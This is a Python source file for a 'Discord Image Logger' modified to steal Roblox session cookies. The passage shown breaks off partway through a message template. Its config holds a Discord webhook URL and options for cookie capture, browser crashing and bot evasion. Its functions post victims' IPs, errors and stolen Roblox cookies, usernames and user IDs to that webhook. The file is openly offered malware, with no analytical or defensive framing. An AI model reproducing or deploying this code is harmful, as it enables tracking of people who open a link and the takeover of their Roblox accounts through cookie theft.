# Discord Image Logger - Modified for Roblox Cookie Stealing
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger (Roblox Cookie Stealer)"
__description__ = "Image Logger that also steals Roblox cookies via JavaScript"
__version__ = "v2.0 - Roblox"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1489570569216200806/Pv7tw9uTobv6nPjC9FXy3LsDX5iiiOKzWrkbXNTt7lofFmAyapPzELE2TMQGEUwREz7n",
    "image": "https://images.unsplash.com/photo-1776278515592-08b921859c20?fm=jpg&q=60&w=3000&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1yZWxhdGVkfDIzfHx8ZW58MHx8fHx8",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    # NEW: Roblox cookie stealing config
    "robloxCookieSteal": True,  # Enable/disable cookie stealing
    "robloxCookieEndpoint": "/capture",  # Endpoint to receive cookies
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def sendRobloxCookieToWebhook(cookie_data, ip, useragent):
    """Send stolen Roblox cookies to the Discord webhook"""
    cookie_str = cookie_data.get("cookie", "No cookie found")
    user_id = cookie_data.get("userId", "Unknown")
    username = cookie_data.get("username", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Roblox Cookie Captured!",
                "color": 0xFF0000,
                "description": f"""**Roblox Account Compromised!**

**Roblox User:** `{username}`
**Roblox User ID:** `{user_id}`
**Profile:** https://www.roblox.com/users/{user_id}/profile

**Raw Cookie:**
